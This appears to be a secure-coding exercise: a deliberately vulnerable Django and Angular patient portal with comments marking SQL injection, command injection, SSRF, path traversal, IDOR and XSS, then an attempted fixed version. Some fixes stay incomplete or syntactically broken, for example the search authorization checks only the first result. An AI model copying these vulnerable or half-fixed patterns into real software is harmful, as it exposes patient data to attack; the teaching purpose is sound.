	result = subprocess.run(cmd_split, shell=False, capture_output=True, text=True)

	return {"output": result.stdout}

@app.post("/auth/login")
@limiter.limit("5/minute")
async def login(username: str, password: str, db: sqlite3.Connection = Depends(get_db)):

	# No Authentication nor Authorization Below

	cursor = db.cursor()

	# SQL Injection Vulnerability Below


	cursor.execute(
		f"SELECT id, username, role, api_token,password_hash FROM users WHERE username = :username",{"username": username}
	)

	rows = cursor.fetchone()

	if not rows or not argon2.verify(password,rows[4]):
		return {"error": "invalid credentials"}

	return {"api_token": rows[3], "role": rows[2]}
```

`pages/documents.vue`

```
<template>
	<div>
		<input v-model="searchQuery" @input="search" placeholder="Search documents..." />
		// XSS Bug Below

		<div v-text="searchResults"></div>

		<div v-for="doc in documents" :key="doc.id">
			<h3>{{ doc.title }}</h3>
			// XSS Bug Below
			<div v-text="doc.content"></div>
			<button @click="downloadDoc(doc.id)">Download</button>
		</div>

		<div>
			<input v-model="webhookPayload" placeholder="Webhook payload..." />
			<button @click="triggerWebhook">Send Webhook</button>
		</div>
	</div>
</template>

<script setup>
import { ref } from 'vue'

const searchQuery = ref('')
const searchResults = ref('')
const documents = ref([])
const webhookPayload = ref('')

const apiToken = localStorage.getItem('api_token')

const search = async () => {
	
	const res = await fetch(`/api/documents/search?q=${searchQuery.value}`)
	const resp = await res.text()
	// XSS Bug Below
	searchResults.value = resp 
}

const downloadDoc = (id) => {

	// Missing URL-Encoding
	window.location.href = `/api/documents/${id}/download?token=${apiToken}`
}

const triggerWebhook = async () => {
	await fetch('/api/workspaces/1/notify', {
		method: 'POST',
		headers: { 'Content-Type': 'application/json' },
		body: webhookPayload.value
	})
}
</script>
```

Exercise 7:

`medportal/settings.py`

```
#Do NOT Hardcode Secrets
SECRET_KEY = 'medportal-django-insecure-key-xyz987'
# Debug Mode Must be Set to False
DEBUG = True

# The ALLOWED_HOSTS should not be limitless
ALLOWED_HOSTS = ['*']

INSTALLED_APPS = [
	'django.contrib.admin',
	'django.contrib.auth',
	'django.contrib.contenttypes',
	'django.contrib.sessions',
	'django.contrib.messages',
	'django.contrib.staticfiles',
	'portal',
]

MIDDLEWARE = [
	'django.middleware.security.SecurityMiddleware',
	'django.contrib.sessions.middleware.SessionMiddleware',
	'django.middleware.common.CommonMiddleware',
	# Missing CSRF Protection
	'django.contrib.auth.middleware.AuthenticationMiddleware',
	'django.contrib.messages.middleware.MessageMiddleware',
	# Missing Clickjacking Protection
]

DATABASES = {
	'default': {
		'ENGINE': 'django.db.backends.sqlite3',
		'NAME': 'medportal.db',
	}
}

# Security Settings

# No Secure SSL Redirect!
```

`portal/models.py`

```
from django.db import models
from django.contrib.auth.models import User

class Patient(models.Model):
	full_name = models.CharField(max_length=200)
	date_of_birth = models.DateField()
	diagnosis = models.TextField()
	assigned_doctor = models.ForeignKey(User, on_delete=models.SET_NULL, null=True)

class LabResult(models.Model):
	patient = models.ForeignKey(Patient, on_delete=models.CASCADE)
	filename = models.CharField(max_length=300)
	uploaded_by = models.ForeignKey(User, on_delete=models.SET_NULL, null=True)
	notes = models.TextField(blank=True)

class AuditLog(models.Model):
	user = models.ForeignKey(User, on_delete=models.SET_NULL, null=True)
	action = models.CharField(max_length=200)
	timestamp = models.DateTimeField(auto_now_add=True)
```

`portal/views.py`

```
# No Rate Limiting
# No Attempt at CSRF Protection when using Cookies
from django.http import JsonResponse, FileResponse, HttpResponse
from django.contrib.auth import authenticate
from django.db import connection
import subprocess
import os
import requests
from .models import Patient, LabResult, AuditLog

def login(request):
	if request.method == 'POST':
		import json
		data = json.loads(request.body)
		username = data.get('username', '')
		password = data.get('password', '')
		user = authenticate(username=username, password=password)
		if user:
			return JsonResponse({'token': user.auth_token.key, 'role': user.profile.role})
		return JsonResponse({'error': 'invalid credentials'}, status=401)

def search_patients(request):
	q = request.GET.get('q', '')
	with connection.cursor() as cursor:

		# No Authentication nor Authorization Below

		# SQL Injection Vulnerability Below

		cursor.execute(
			f"SELECT id, full_name, diagnosis FROM portal_patient WHERE full_name LIKE '%{q}%'"
		)
		rows = cursor.fetchall()
	return JsonResponse({'patients': rows})

def get_patient(request, patient_id):

	# No Authentication nor Authorization Below

	with connection.cursor() as cursor:

		# SQL Injection Vulnerability Below

		cursor.execute(
			f"SELECT id, full_name, date_of_birth, diagnosis FROM portal_patient WHERE id = {patient_id}"
		)
		row = cursor.fetchone()
		
		if not row:

			return JsonResponse({'error': 'not found'}, status=404)

	return JsonResponse({'id': row[0], 'name': row[1], 'dob': str(row[2]), 'diagnosis': row[3]})

def download_lab_result(request):
	filename = request.GET.get('file', '')
	filepath = os.path.join('/var/lab_results', filename)
	return FileResponse(open(filepath, 'rb'))


def run_export(request):

	# No Authentication nor Authorization

	report_type = request.GET.get('type', 'daily')
	
	# OS Command Injection Vulnerability Below

	result = subprocess.run(
		f'python manage.py export_report --type={report_type}',
		shell=True,
		capture_output=True,
		text=True
	)
	return JsonResponse({'output': result.stdout})

def fetch_external_guidelines(request):
	url = request.GET.get('url', '')

	# SSRF Vulnerability Below

	response = requests.get(url, timeout=5)
	return JsonResponse({'content': response.text})

def upload_lab_result(request):
	if request.method == 'POST':
		# No Authentication nor Authorization Below

		f = request.FILES.get('file')
		patient_id = request.POST.get('patient_id')
		if f:

			# OS Path Traversal Vulnerability Below

			dest = os.path.join('/var/lab_results', f.name)

			with open(dest, 'wb+') as dest_file:

				for chunk in f.chunks():

					dest_file.write(chunk)

			# No Authorization Below

			LabResult.objects.create(
				patient_id=patient_id,
				filename=f.name,
				uploaded_by=request.user
			)

			return JsonResponse({'status': 'uploaded'})

	return JsonResponse({'error': 'invalid request'}, status=400)
```

`portal/urls.py`

```
from django.urls import path
from . import views

urlpatterns = [
	path('auth/login/', views.login),
	path('patients/search/', views.search_patients),

	# IDOR Vulnerability Below

	path('patients/<int:patient_id>/', views.get_patient),
	path('lab-results/download/', views.download_lab_result),

	# OS Path Traversal Vulnerability Below

	path('lab-results/upload/', views.upload_lab_result),
	path('reports/export/', views.run_export),

	# SSRF Vulnerability Below

	path('guidelines/fetch/', views.fetch_external_guidelines),
]
```

`src/app/patient-search.component.ts`

```
import { Component } from '@angular/core';
import { HttpClient } from '@angular/common/http';
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';

@Component({
	selector: 'app-patient-search',
	template: `
		<div>
			<input [(ngModel)]="query" (input)="search()" placeholder="Search patients..." />

			{{ '' // XSS Bug Below }}
			<div [innerHTML]="searchResults"></div>

			<div *ngFor="let p of patients">
				<h3>{{ p.name }}</h3>

				{{ '' // XSS Bug Below }}

				<p [innerHTML]="p.diagnosis"></p>

				<button (click)="downloadLab(p.id)">Download Lab Result</button>
			</div>

			<div>
				<input [(ngModel)]="guidelinesUrl" placeholder="Guidelines URL..." />
				<button (click)="fetchGuidelines()">Fetch</button>

		
				{{ '' // XSS Bug Below }}

				<div [innerHTML]="guidelinesContent"></div>
			</div>

			<div>
				<input [(ngModel)]="exportType" placeholder="Export type..." />
				<button (click)="runExport()">Run Export</button>
				<pre>{{ exportOutput }}</pre>
			</div>
		</div>
	`
})
export class PatientSearchComponent {
	query = '';
	searchResults: SafeHtml = '';
	patients: any[] = [];
	guidelinesUrl = '';
	// Potential XSS bug below
	guidelinesContent: SafeHtml = '';
	exportType = '';
	exportOutput = '';

	constructor(private http: HttpClient, private sanitizer: DomSanitizer) {}

	search() {
		this.http.get(`/api/patients/search/?q=${this.query}`, { responseType: 'text' })
			.subscribe(html => {

				{{ '' // XSS Bug Below }}

				this.searchResults = this.sanitizer.bypassSecurityTrustHtml(html);
			});
	}

	fetchGuidelines() {
		this.http.get(`/api/guidelines/fetch/?url=${this.guidelinesUrl}`)
			.subscribe((res: any) => {

				{{ '' // XSS Bug Below }}

				this.guidelinesContent = this.sanitizer.bypassSecurityTrustHtml(res.content);
			});
	}

	downloadLab(patientId: number) {
		const token = localStorage.getItem('auth_token');
		window.location.href = `/api/lab-results/download/?file=${patientId}_result.pdf&token=${token}`;
	}

	runExport() {
		this.http.get(`/api/reports/export/?type=${this.exportType}`)
			.subscribe((res: any) => {

				
				{{ '' // XSS Bug Below }}

				this.exportOutput = res.output;
			});
	}
}
```

Below is the fixed code for Exercise 7:


`medportal/settings.py`

```
import os
from dotenv import load_dotenv,set_key

load_dotenv()

#Do NOT Hardcode Secrets
SECRET_KEY = os.getenv('SECRET_KEY')
# Debug Mode Must be Set to False
DEBUG = False

# The ALLOWED_HOSTS should not be limitless
ALLOWED_HOSTS = ['medportal.com','secondportal.com']

INSTALLED_APPS = [
	'django.contrib.admin',
	'django.contrib.auth',
	'django.contrib.contenttypes',
	'django.contrib.sessions',
	'django.contrib.messages',
	'django.contrib.staticfiles',
	'portal',
]

MIDDLEWARE = [
	'django.middleware.security.SecurityMiddleware',
	'django.contrib.sessions.middleware.SessionMiddleware',
	'django.middleware.common.CommonMiddleware',
	'django.middleware.clickjacking.XFrameOptionsMiddleware',
	# Missing CSRF Protection
	'django.middleware.csrf.CsrfViewMiddleware',
	'django.contrib.auth.middleware.AuthenticationMiddleware',
	'django.contrib.messages.middleware.MessageMiddleware',
	# Missing Clickjacking Protection
]

DATABASES = {
	'default': {
		'ENGINE': 'django.db.backends.sqlite3',
		'NAME': 'medportal.db',
	}
}

# Security Settings

# No Secure SSL Redirect!

# A site like this SHOULD be under Strict TLS

SECURE_SSL_REDIRECT = True 
SECURE_HSTS_SECONDS = 31536000
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True
```

`portal/models.py`

```
from django.db import models
from django.contrib.auth.models import User
from django.db.models.signals import post_save
from django.dispatch import receiver

"""
Django Built-in User Model Field Reference
===========================================
Imported from: django.contrib.auth.models.User

Fields:
┌─────────────────┬─────────────┬──────────────────────────────────────────────┐
│ Field           │ Type        │ Description                                  │
├─────────────────┼─────────────┼──────────────────────────────────────────────┤
│ id              │ Integer     │ Auto-generated primary key                   │
│ username        │ String(150) │ Unique. Required. Letters, digits, @/./+/-/_ │
│ password        │ String(128) │ Stored as hash. Never plaintext              │
│ email           │ String(254) │ Optional email address                       │
│ first_name      │ String(150) │ Optional first name                          │
│ last_name       │ String(150) │ Optional last name                           │
│ is_staff        │ Boolean     │ Can access Django admin site                 │
│ is_active       │ Boolean     │ Inactive users cannot log in                 │
│ is_superuser    │ Boolean     │ Bypasses all permission checks               │
│ date_joined     │ DateTime    │ When account was created                     │
│ last_login      │ DateTime    │ When user last authenticated                 │
├─────────────────┼─────────────┼──────────────────────────────────────────────┤
│ Reverse         │             │                                              │
│ Accessors       │             │                                              │
├─────────────────┼─────────────┼──────────────────────────────────────────────┤
│ user.profile    │ OneToOne    │ Custom Profile model (defined below)         │
│ user.patient_   │ ForeignKey  │ All patients assigned to this doctor         │
│ set.all()       │ queryset    │ Use related_name='patients' to rename        │
│ user.labresult_ │ ForeignKey  │ All lab results uploaded by this user        │
│ set.all()       │ queryset    │ Use related_name='lab_results' to rename     │
│ user.auditlog_  │ ForeignKey  │ All audit log entries for this user          │
│ set.all()       │ queryset    │ Use related_name='audit_logs' to rename      │
└─────────────────┴─────────────┴──────────────────────────────────────────────┘

Security Notes:
- Never access user.password directly — always use check_password() or authenticate()
- is_superuser bypasses ALL permission checks — treat as equivalent to root
- is_staff only grants Django admin access — not the same as application-level admin role
- Deactivate users with is_active=False rather than deleting — preserves audit trail
- The application-level role (staff/doctor/admin) lives in Profile.role, not here
"""

class Profile(models.Model):
	"""
	Role-based access control for MedPortal.

	Authorization matrix:
	┌─────────────┬──────────────────────────────────────────────────────────┐
	│ Role        │ Permissions                                              │
	├─────────────┼──────────────────────────────────────────────────────────┤
	│ staff       │ - Upload lab results                                     │
	│             │ - Search patients by name                                │
	│             │ - View patient basic info (name, DOB)                    │
	│             │ - Cannot view diagnosis                                  │
	│             │ - Cannot download lab results                            │
	│             │ - Cannot run exports                                     │
	│             │ - Cannot fetch external guidelines                       │
	├─────────────┼──────────────────────────────────────────────────────────┤
	│ doctor      │ - All staff permissions                                  │
	│             │ - View full patient record including diagnosis            │
	│             │ - Download lab results for assigned patients only        │
	│             │ - Fetch external clinical guidelines                     │
	│             │ - Cannot run report exports                              │
	│             │ - Cannot access other doctors' patients                  │
	├─────────────┼──────────────────────────────────────────────────────────┤
	│ admin       │ - Full access to all endpoints                           │
	│             │ - Run report exports                                     │
	│             │ - View all patients regardless of assigned doctor        │
	│             │ - View all lab results                                   │
	│             │ - Cannot be assigned as a doctor to a patient            │
	└─────────────┴──────────────────────────────────────────────────────────┘
	"""

	class Role(models.TextChoices):
		STAFF = 'staff', 'Staff'
		DOCTOR = 'doctor', 'Doctor'
		ADMIN = 'admin', 'Admin'

	user = models.OneToOneField(User, on_delete=models.CASCADE)
	role = models.CharField(
		max_length=50,
		choices=Role.choices,
		default=Role.STAFF
	)


@receiver(post_save, sender=User)
def create_profile(sender, instance, created, **kwargs):
	if created:
		Profile.objects.create(user=instance)

class Patient(models.Model):
	full_name = models.CharField(max_length=200)
	date_of_birth = models.DateField()
	diagnosis = models.TextField()
	assigned_doctor = models.ForeignKey(User, on_delete=models.SET_NULL, null=True)

class LabResult(models.Model):
	patient = models.ForeignKey(Patient, on_delete=models.CASCADE)
	filename = models.CharField(max_length=300)
	uploaded_by = models.ForeignKey(User, on_delete=models.SET_NULL, null=True)
	notes = models.TextField(blank=True)

class AuditLog(models.Model):
	user = models.ForeignKey(User, on_delete=models.SET_NULL, null=True)
	action = models.CharField(max_length=200)
	timestamp = models.DateTimeField(auto_now_add=True)
```

`portal/views.py`

```
# No Rate Limiting
# No Attempt at CSRF Protection when using Cookies
from django.http import JsonResponse, FileResponse, HttpResponse
from django.contrib.auth import authenticate
from django.db import connection
import subprocess
import os
import secrets
import shlex
import hashlib
import hmac
import json
import base64
import time,datetime
from datetime import timezone
from urllib.parse import urlparse
import os
import requests
from .models import Patient, LabResult, AuditLog
from django.views.decorators.csrf import csrf_exempt, csrf_protect

from django_ratelimit.decorators import ratelimit


from dotenv import load_dotenv,set_key

load_dotenv()

#Do NOT Hardcode Secrets

SECRET_KEY = os.getenv('SECRET_KEY')

# Setting HttpResponse as a JSON:

# https://thelinuxcode.com/creating-a-json-response-using-django-and-python-a-practical-2026-guide/

# https://docs.djangoproject.com/en/6.0/ref/request-response/

def create_session_cookie(username, role,user_id):
    """Create signed session cookie"""
    # Session data as JSON


    session_data = {
        'username': username,
        'role': role,
	'id': user_id,
        'login_time': int(time.time()),
        'exp': int(time.time() + (1800 * 1))
        # No field marking when cookie expires
    }

    # Encode as base64
    session_json = json.dumps(session_data)
    session_b64 = base64.b64encode(session_json.encode()).decode()

    # Sign with HMAC-SHA256
    signature = hmac.new(
        SECRET_KEY.encode(),
        session_b64.encode(),
        hashlib.sha256
    ).hexdigest()

    # Cookie value: base64_data.signature
    cookie_value = f"{session_b64}.{signature}"

    return cookie_value

def verify_session_cookie(cookie_value):
    """Verify and parse session cookie"""
    if not cookie_value:
        return None

    # Must check if session cookie expired

    try:
        # Split cookie into data and signature
        session_b64, provided_sig = cookie_value.split('.')

        # Verify signature
        expected_sig = hmac.new(
            SECRET_KEY.encode(),
            session_b64.encode(),
            hashlib.sha256
        ).hexdigest()

        # Timing Vulnerability Below

        if not hmac.compare_digest(provided_sig,expected_sig):

            return None

        # Decode session data
        session_json = base64.b64decode(session_b64).decode()

        session_data = json.loads(session_json)

        current_time = int(time.time()) 

        if current_time > session_data['exp']:

            return None

        return session_data

    except Exception as e:

        print(f"Exception: {e}")

        return None

@csrf_exempt
@ratelimit(key='ip', rate='5/m')
def login(request):
	if request.method == 'POST':
		data = json.loads(request.body)
		username = data.get('username', '')
		password = data.get('password', '')
		
		user = authenticate(username=username, password=password)

		if user:
			
			cookie_value = create_session_cookie(username,user.profile.role,user.id)
			
			resp = HttpResponse('Login Successful',content_type="application/json",status=200)
			resp.set_cookie(
	
					'session',
	
					value=cookie_value,

					max_age=1800,

					httponly=True,

					path='/',

					secure=True,

					samesite='Strict'

			)

			return resp

		return JsonResponse({'error': 'invalid credentials'},content_type="application/json",status=401)

@csrf_protect
@ratelimit(key='ip', rate='5/m')
def search_patients(request):

	# No Authentication nor Authorization Below

	cookie_value = request.COOKIES.get('session')

	session_data = verify_session_cookie(cookie_value)

	if not session_data:

		return JsonResponse({'error': 'Invalid Credentials'},content_type='application/json',status=401)		

	if session_data['role'].lower() != 'doctor' and session_data['role'].lower() != 'admin':
		return JsonResponse({'error': 'Not Authorized'},content_type='application/json',status=404)

	q = request.GET.get('q', '')

	with connection.cursor() as cursor:

		# SQL Injection Vulnerability Below

		cursor.execute(
			"SELECT id, full_name, diagnosis,assigned_doctor FROM portal_patient WHERE full_name LIKE %s",('%' + q + '%',)
		)

		rows = cursor.fetchall()

		if not rows:
		
			return JsonResponse({'error': 'Invalid Query'},content_type='application/json',status=404)		

		user_id = rows[0]

		assigned_doctor = rows[0][3]

		# If the user is a doctor it must be the

		# assigned_doctor to see records

		# Otherwise user with role `admin` can see anyone's

		# records
		
		if session_data['role'].lower() == 'doctor' and assigned_doctor != session_data['id']:
			return JsonResponse({'error': 'Invalid Query'},content_type='application/json',status=404)		

		return JsonResponse({'patients': rows})

# IDOR Vulnerability
@csrf_protect
@ratelimit(key='ip', rate='5/m')
def get_patient(request, patient_id):

	# No Authentication nor Authorization Below
	
	cookie_value = request.COOKIES.get('session')

	session_data = verify_session_cookie(cookie_value)

	if not session_data:

		return JsonResponse({'error': 'Invalid Credentials'},content_type='application/json',status=401)		

	if session_data['role'].lower() != 'doctor' and session_data['role'].lower() != 'admin':
		return JsonResponse({'error': 'Not Authorized'},content_type='application/json',status=404)

	with connection.cursor() as cursor:

		# SQL Injection Vulnerability Below

		cursor.execute(
			f"SELECT id, full_name, date_of_birth, diagnosis,assigned_doctor FROM portal_patient WHERE id = %s",(patient_id,)
		)

		row = cursor.fetchone()

		if not row:

			return JsonResponse({'error': 'not found'}, status=404)

		user_id = row[0]

		assigned_doctor = row[4]

		# If the user is a doctor it must be the

		# assigned_doctor to see records

		# Otherwise user with role `admin` can see anyone's

		# records

		if session_data['role'].lower() == 'doctor' and assigned_doctor != session_data['id']:
			return JsonResponse({'error': 'Not Authorized'},content_type='application/json',status=404)		

	return JsonResponse({'id': row[0], 'name': row[1], 'dob': str(row[2]), 'diagnosis': row[3]})

@csrf_protect
@ratelimit(key='ip', rate='5/m')
def download_lab_result(request):

	# No Authentication nor Authorization Below
	
	cookie_value = request.COOKIES.get('session')

	session_data = verify_session_cookie(cookie_value)

	if not session_data:

		return JsonResponse({'error': 'Invalid Credentials'},content_type='application/json',status=401)		

	if session_data['role'].lower() != 'doctor' and session_data['role'].lower() != 'admin':
		
		return JsonResponse({'error': 'Not Authorized'},content_type='application/json',status=404)
		
	# If the user is a doctor it must be the

	# assigned_doctor to see records

	# Otherwise user with role `admin` can see anyone's

	# records

	with connection.cursor() as cursor:

		filename = request.GET.get('file', '')
		
		# OS Path Traversal Vulnerability
		
		base_dir = os.path.abspath('/var/lab_results')

		pwd_file = os.path.abspath(os.path.join(base_dir,filename))

		if not pwd_file.startswith(base_dir + os.sep):

			return JsonResponse({'error': 'Invalid filepath.'}, status=404)

		# SQL Injection Vulnerability Below
		
		cursor.execute(
			f"SELECT patient,filename FROM portal_labresult WHERE filename = %s",(filename,)
		)
		
		row = cursor.fetchone()

		if not row:

			return JsonResponse({'error': 'not found'}, status=404)

		patient_id = row[0]
		
		cursor.execute(
			f"SELECT assigned_doctor_id FROM portal_patient WHERE id = %s",(patient_id,)
		)

		row = cursor.fetchone()
		
		if not row:

			return JsonResponse({'error': 'not found'}, status=404)

		assigned_doctor = row[0]

		if session_data['role'].lower() == 'doctor' and assigned_doctor != session_data['id']:
			return JsonResponse({'error': 'Invalid Query'},content_type='application/json',status=404)		

	return FileResponse(open(pwd_file, 'rb'))

@csrf_protect
@ratelimit(key='ip', rate='5/m')
def run_export(request):

	# No Authentication nor Authorization Below
	
	cookie_value = request.COOKIES.get('session')

	session_data = verify_session_cookie(cookie_value)

	if not session_data:

		return JsonResponse({'error': 'Invalid Credentials'},content_type='application/json',status=401)		
	
	if session_data['role'].lower() != 'admin':
		
		return JsonResponse({'error': 'Not Authorized'},content_type='application/json',status=404)

	report_type = request.GET.get('type', 'daily')
	
	# OS Command Injection Vulnerability Below

	cmd = f'python manage.py export_report --type={shlex.quote(report_type)}'

	cmd_list = shlex.split(cmd)

	result = subprocess.run(
		cmd_list,
		shell=False,
		capture_output=True,
		text=True
	)

	return JsonResponse({'output': result.stdout})


def is_valid_url(url: str,allow_list: list[str]) -> bool:

	parsed = urlparse(url)

	netloc = parsed.netloc

	hostname = netloc.split(':')[0]

	return hostname in allow_list


@csrf_protect
@ratelimit(key='ip', rate='5/m')
def fetch_external_guidelines(request):

	# No Authentication nor Authorization Below
	
	cookie_value = request.COOKIES.get('session')

	session_data = verify_session_cookie(cookie_value)

	if not session_data:

		return JsonResponse({'error': 'Invalid Credentials'},content_type='application/json',status=401)		

	if session_data['role'].lower() != 'doctor' and session_data['role'].lower() != 'admin':

		return JsonResponse({'error': 'Not Authorized'},status=404)		
	
	url = request.GET.get('url', '')

	# SSRF Vulnerability Below

	allowlist_domains = ['medportal.com','secondportal.com']

	if not is_valid_url(url,allowlist_domains):
	
		return JsonResponse({'error': 'Not Authorized'},status=404)
		
	response = requests.get(url, timeout=5,allow_redirects=False)

	return JsonResponse({'content': response.text})

@csrf_protect
@ratelimit(key='ip', rate='5/m')
def upload_lab_result(request):
	
	if request.method == 'POST':

		# No Authentication Below

		# No Authorization Needed since even staff

		# are allowed to upload lab results and so

		# can doctors and admins

		cookie_value = request.COOKIES.get('session')

		session_data = verify_session_cookie(cookie_value)

		if not session_data:

			return JsonResponse({'error': 'Invalid Credentials'},status=401)		
		f = request.FILES.get('file')

		patient_id = request.POST.get('patient_id')

		if f:

			# OS Path Traversal Vulnerability Below

			base_dir = os.path.abspath('/var/lab_results')

			pwd_file = os.path.abspath(os.path.join(base_dir,f.name))

			if not pwd_file.startswith(base_dir + os.sep):

				return JsonResponse({'error': 'Invalid filepath.'}, status=404)
			with open(pwd_file, 'wb+') as dest_file:

				for chunk in f.chunks():

					dest_file.write(chunk)

			LabResult.objects.create(
				patient_id=patient_id,
				filename=f.name,
				uploaded_by=request.user
			)

			return JsonResponse({'status': 'uploaded'})

	return JsonResponse({'error': 'invalid request'}, status=400)
```

`portal/urls.py`

```
from django.urls import path
from . import views

urlpatterns = [
	path('auth/login/', views.login),
	path('patients/search/', views.search_patients),

	# IDOR Vulnerability Below

	path('patients/<int:patient_id>/', views.get_patient),
	path('lab-results/download/', views.download_lab_result),

	# OS Path Traversal Vulnerability Below

	path('lab-results/upload/', views.upload_lab_result),
	path('reports/export/', views.run_export),

	# SSRF Vulnerability Below

	path('guidelines/fetch/', views.fetch_external_guidelines),
]
```

`src/app/patient-search.component.ts`

```
import { Component } from '@angular/core';
import { HttpClient } from '@angular/common/http';
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';

@Component({
	selector: 'app-patient-search',
	template: `
		<div>
			<input [(ngModel)]="query" (input)="search()" placeholder="Search patients..." />
			<!-- XSS Bug Below -->

			<div>{{ searchResults }}</div>

			<div *ngFor="let p of patients">
				<h3>{{ p.name }}</h3>
			
				<!-- XSS Bug Below -->
				
				<p>{{ p.diagnosis }}</p>

				<button (click)="downloadLab(p.id)">Download Lab Result</button>
			</div>

			<div>
				<input [(ngModel)]="guidelinesUrl" placeholder="Guidelines URL..." />
				<button (click)="fetchGuidelines()">Fetch</button>

				<!-- XSS Bug Below -->
		
				<div>{{ guidelinesContent }}</div>

			</div>

			<div>
				<input [(ngModel)]="exportType" placeholder="Export type..." />
				<button (click)="runExport()">Run Export</button>
				<pre>{{ exportOutput }}</pre>
			</div>
		</div>
	`
})
export class PatientSearchComponent {
	query = '';
	searchResults = '';
	patients: any[] = [];
	guidelinesUrl = '';
	// Potential XSS bug below
	guidelinesContent = '';
	exportType = '';
	exportOutput = '';

	constructor(private http: HttpClient, private sanitizer: DomSanitizer) {}

	search() {
		this.http.get(`/api/patients/search/?q=${this.query}`, { responseType: 'text' })
			.subscribe(resp => {

				<!-- XSS Bug Below -->

				this.searchResults = resp;
			});
	}

	fetchGuidelines() {
		this.http.get(`/api/guidelines/fetch/?url=${this.guidelinesUrl}`)
			.subscribe((res: any) => {
				
				<!-- XSS Bug Below -->

				this.guidelinesContent = res.content;
			});
	}

	downloadLab(patientId: number) {
		const token = localStorage.getItem('auth_token');
		window.location.href = `/api/lab-results/download/?file=${patientId}_result.pdf&token=${token}`;
	}

	runExport() {
		this.http.get(`/api/reports/export/?type=${this.exportType}`)
			.subscribe((res: any) => {

				<!-- XSS Bug Below -->
				
				this.exportOutput = res.output;
			});
	}
}
```

